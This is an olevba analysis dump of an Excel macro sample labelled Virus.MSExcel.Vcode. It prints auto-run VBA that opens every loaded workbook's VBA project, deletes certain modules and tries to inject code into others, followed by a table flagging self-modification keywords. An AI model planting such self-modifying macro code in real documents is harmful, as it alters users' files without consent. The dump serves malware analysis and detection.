olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Vcode-f5146a1cf7c246496adab08084962e3c4950f217
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Vcode-f5146a1cf7c246496adab08084962e3c4950f217 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_Open()
On Error Resume Next
final = False
For i = 1 To Workbooks.Count
For j = 1 To Workbooks(i).VBProject.VBComponents.Count
flag = False
vvcode = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.Lines(1, 1)
If vvcode = "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" Then
  flag = True
  final = True
End If

eline = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines

  
If flag = True Then
Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.DeleteLines 1, eline
End If
Next j
Next i

For i = 1 To Workbooks.Count
vcount = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.CountOfLines
vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, vcount)
If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.AddFromString (vcode)
Next i

If final = True Then MsgBox "hjb¹ÙÀÌ·¯½º °É·Á¼­ Ä¡·á¿Ï·áÇß½À´Ï´Ù.", vbOKOnly

End Sub

Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)
On Error Resume Next
final = False
For i = 1 To Workbooks.Count
For j = 1 To Workbooks(i).VBProject.VBComponents.Count
flag = False
vvcode = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.Lines(1, 1)
If vvcode = "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)" Then
  flag = True
  final = True
End If

eline = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines

  
If flag = True Then
Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.DeleteLines 1, eline
End If
Next j
Next i

For i = 1 To Workbooks.Count
vcount = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.CountOfLines
vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, vcount)
If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.AddFromString (vcode)
Next i

If final = True Then MsgBox "hjb¹ÙÀÌ·¯½º °É·Á¼­ Ä¡·á¿Ï·áÇß½À´Ï´Ù.", vbOKOnly

End Sub



-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Vcode-f5146a1cf7c246496adab08084962e3c4950f217 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Vcode-f5146a1cf7c246496adab08084962e3c4950f217 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Vcode-f5146a1cf7c246496adab08084962e3c4950f217 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

